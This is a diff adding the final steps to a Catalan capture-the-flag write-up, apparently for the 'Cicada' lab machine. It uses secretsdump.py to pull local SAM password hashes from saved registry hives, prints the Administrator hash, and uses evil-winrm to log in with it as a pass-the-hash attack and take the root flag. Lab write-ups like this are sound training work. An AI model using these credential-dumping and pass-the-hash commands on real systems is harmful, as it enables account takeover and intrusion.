@@ -610,3 +610,30 @@ Info: Download successful!
 Info: Downloading C:\Temp\system to system
 Progress: 17% : |▒░░░░░░░░░|       
 ```
+
+Ara utilitzarem l'eina "secretsdump.py" per extreure la contrasenya dels fitxers sam i del sistema, la hem tret d'aquest repositori de GitHub: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py .
+```
+┌──(kali㉿kali)-[~]
+└─$ python3 /home/kali/Downloads/secretsdump.py -sam sam -system system LOCAL > contrasenya_admin.txt 
+┌──(kali㉿kali)-[~]
+└─$ cat contrasenya_admin.txt 
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x3c2b033757a49110a9ee680b46e8d620
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
+[*] Cleaning up... 
+
+```
+
+Ara tenim un hash de contrasenya d'usuari administrador que es pot tornar a utilitzar amb evil-winrm per obtenir l'accés root.
+```
+evil-winrm -i cicada.htb -u 'Administrator' -p 'aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341'
+cd ../Desktop
+ls
+```
+
+Hem anat a Desktop i hem trobat la flag de root, ara ja tenim la flag de root!
